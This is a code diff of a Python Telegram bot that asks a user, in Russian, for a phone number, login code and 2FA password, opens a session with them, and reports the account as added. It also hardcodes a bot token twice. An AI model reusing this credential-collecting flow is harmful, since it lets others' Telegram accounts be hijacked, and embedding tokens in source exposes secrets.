@@ -12,6 +12,7 @@ bot = Client('noti_bot', bot_token='1708936291:AAFnMkJN2R1-7Mazl-tptY8cJsbEpIWJ3
 
 class StateManager(Client):
     state = None
+    one = None
 
     def __init__(self, config):
         print('State_manager started')
@@ -42,24 +43,41 @@ class StateManager(Client):
     def make_state(self, state):
         self.state = state
 
+    def make_one(self, state):
+        self.one = state
+
 state_m = StateManager(config)
-redis = Redis()
+
+def msg_agent():
+    bot = Client('msg_agent', bot_token='1708936291:AAFnMkJN2R1-7Mazl-tptY8cJsbEpIWJ38w')
+    redis = Redis()
+
+    with bot:
+        while True:
+            msg = redis.hgetall('msg')
+            if msg:
+                print(msg)
+                bot.send_message('@{}'.format(msg[b'id'].decode('UTF-8')), msg[b'text'].decode('UTF-8'))
+                redis.delete('msg')
+
 
 def handlers():
+    redis = Redis()
 
     @bot.on_message(filters.command('start'), group=3)
     def start(client, msg):
         print('start')
-        bot.send_message(msg.from_user.id, "Введите номер")
+        redis.hmset('msg', {"id": "WhileForInt", "text": "Введите номер"})
         state_m.make_state('wait_for_phone')
+        state_m.make_one(True)
 
 
-    @bot.on_message(group=2)
+    @bot.on_message(~filters.me, group=2)
     def wait_code(client, msg):
         if state_m.state == 'wait_for_phone':
             print('wait_code')
             phone_number = msg.text
-
+            print('number {}'.format(phone_number))
             state_m.start_session(phone_number)
             bot.send_message(msg.from_user.id, "Номер принят")
             bot.send_message(msg.from_user.id, "Введите код")
@@ -67,7 +85,7 @@ def handlers():
             bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
 
 
-    @bot.on_message(group=1)
+    @bot.on_message(~filters.me, group=1)
     def wait_2fa(client, msg):
         if state_m.state == 'wait_for_code':
             print('wait_2fa')
@@ -84,7 +102,7 @@ def handlers():
                 bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
 
 
-    @bot.on_message(group=0)
+    @bot.on_message(~filters.me, group=0)
     def final(client, msg):
         if state_m.state == 'wait_for_2fa':
             print('final')
@@ -94,10 +112,15 @@ def handlers():
             bot.send_message(msg.from_user.id, "Аккаунт добавлен")
             bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
 
+    state_m.make_one(False)
+
     bot.run()
 
+msg_agent = Process(target=msg_agent, args=())
 handlers = Process(target=handlers, args=())
 handlers.start()
+msg_agent.start()
 handlers.join()
+msg_agent.join()
 
 print('Pyro started')
